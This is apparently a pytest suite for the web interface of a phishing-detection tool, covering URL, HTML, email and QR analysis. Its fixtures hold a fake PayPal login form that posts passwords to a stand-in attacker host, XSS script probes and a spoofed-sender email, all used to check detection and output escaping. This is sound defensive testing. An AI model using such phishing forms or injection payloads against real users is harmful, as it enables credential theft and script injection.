"""Tests for the local web UI (fast mode - no LLM call). Uses FastAPI's
TestClient (in-process, no real server needed)."""
from unittest.mock import patch

import pytest

pytest.importorskip("fastapi", reason="requires requirements-web.txt")

from fastapi.testclient import TestClient

import webapp

client = TestClient(webapp.app)


def test_index_shows_the_form():
    resp = client.get("/")
    assert resp.status_code == 200
    assert "<form" in resp.text
    assert 'name="url"' in resp.text


def test_analyze_benign_shows_green_badge():
    resp = client.post("/analyze", data={"url": "https://example.com"})
    assert resp.status_code == 200
    assert 'class="badge badge-benign"' in resp.text or 'class="badge badge-uncertain"' in resp.text


def test_analyze_blocked_url_shows_error_card():
    resp = client.post("/analyze", data={"url": "http://127.0.0.1:1/"})
    assert resp.status_code == 200
    assert "Erreur" in resp.text
    assert "internal/private address" in resp.text


def test_index_shows_all_four_tabs():
    resp = client.get("/")
    for label in ("URL", "HTML collé", "Email (.eml)", "QR code"):
        assert label in resp.text


def test_analyze_html_endpoint_works():
    html = (
        "<html><head><title>PayPal - Secure Login</title></head>"
        "<body><form action='https://evil.example/collect'><input type=password></form></body></html>"
    )
    resp = client.post(
        "/analyze-html", data={"html": html, "url_hint": "https://totally-fake-paypal.example/"}
    )
    assert resp.status_code == 200
    assert 'class="badge badge-phishing"' in resp.text


def test_analyze_html_escapes_attacker_controlled_content():
    html = "<html><head><title>&lt;ignored&gt;</title></head><body><script>alert(1)</script></body></html>"
    resp = client.post("/analyze-html", data={"html": html, "url_hint": "https://example.com/"})
    assert "<script>alert(1)</script>" not in resp.text


def _write_eml(path, subject="Urgent: verify your account", from_addr="service@paypal.com", auth=None):
    from email.message import EmailMessage

    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = from_addr
    if auth:
        msg["Authentication-Results"] = auth
    msg.set_content("plain fallback")
    msg.add_alternative("<html><head><title>PayPal</title></head><body>hi</body></html>", subtype="html")
    path.write_bytes(bytes(msg))


def test_analyze_email_endpoint_shows_email_card_and_auth_failure(tmp_path):
    eml_path = tmp_path / "spoofed.eml"
    _write_eml(
        eml_path,
        auth=(
            "mx.google.com; dkim=none (message not signed); "
            "spf=fail (google.com: domain of service@paypal.com does not designate "
            "203.0.113.9 as permitted sender) smtp.mailfrom=service@paypal.com; "
            "dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=paypal.com"
        ),
    )
    with open(eml_path, "rb") as f:
        resp = client.post("/analyze-email", files={"eml_file": ("spoofed.eml", f, "message/rfc822")})
    assert resp.status_code == 200
    assert 'class="badge badge-phishing"' in resp.text
    assert "service@paypal.com" in resp.text
    assert "email authentication failed" in resp.text


def test_analyze_email_escapes_attacker_controlled_subject(tmp_path):
    eml_path = tmp_path / "xss.eml"
    _write_eml(eml_path, subject="<script>alert(1)</script>", from_addr="evil@evil.example")
    with open(eml_path, "rb") as f:
        resp = client.post("/analyze-email", files={"eml_file": ("xss.eml", f, "message/rfc822")})
    assert "<script>alert(1)</script>" not in resp.text
    assert "&lt;script&gt;" in resp.text


def test_analyze_qr_decodes_a_real_qr_and_analyzes_the_url(tmp_path):
    qrcode_module = pytest.importorskip("qrcode", reason="requires requirements-qr.txt")
    pytest.importorskip("cv2", reason="requires requirements-qr.txt")

    qr_path = tmp_path / "qr.png"
    qrcode_module.make("https://example.com/").save(qr_path)
    with open(qr_path, "rb") as f:
        resp = client.post("/analyze-qr", files={"qr_file": ("qr.png", f, "image/png")})
    assert resp.status_code == 200
    assert "example.com" in resp.text


def test_analyze_qr_shows_error_for_non_url_content(tmp_path):
    qrcode_module = pytest.importorskip("qrcode", reason="requires requirements-qr.txt")
    pytest.importorskip("cv2", reason="requires requirements-qr.txt")

    qr_path = tmp_path / "qr.png"
    qrcode_module.make("WIFI:S:MyNetwork;T:WPA;P:secret;;").save(qr_path)
    with open(qr_path, "rb") as f:
        resp = client.post("/analyze-qr", files={"qr_file": ("qr.png", f, "image/png")})
    assert resp.status_code == 200
    assert "Erreur" in resp.text


def test_malicious_page_title_is_escaped_not_executed():
    # A phishing page's own title/content is attacker-controlled - it must
    # never be injected into our HTML unescaped (stored XSS in our own
    # tool, against the analyst viewing the report).
    fake_result = {
        "requested_url": "https://evil.example/",
        "final_url": "https://evil.example/",
        "status_code": 200,
        "fetched_at": "2026-01-01T00:00:00+00:00",
        "structure": {
            "title": "<script>alert(1)</script>",
            "forms": [],
            "external_scripts": [],
            "iframes": [],
            "favicon_is_external": False,
            "meta_refresh": False,
        },
        "iocs": {
            "domains": [], "emails": [], "punycode_domains": [],
            "shortener_links": [], "ip_literal_urls": [], "suspicious_tld_domains": [],
        },
        "phishing_heuristic": {"score": 0, "level": "low", "reasons": []},
        "ml_classifier": None,
        "domain_age": None,
        "virustotal": None,
        "verdict": {"label": "uncertain", "confidence": "heuristic-only (ML classifier unavailable)"},
    }
    with patch.object(webapp.rpt, "build_result", return_value=fake_result):
        resp = client.post("/analyze", data={"url": "https://evil.example/"})
    assert "<script>alert(1)</script>" not in resp.text
    assert "&lt;script&gt;" in resp.text
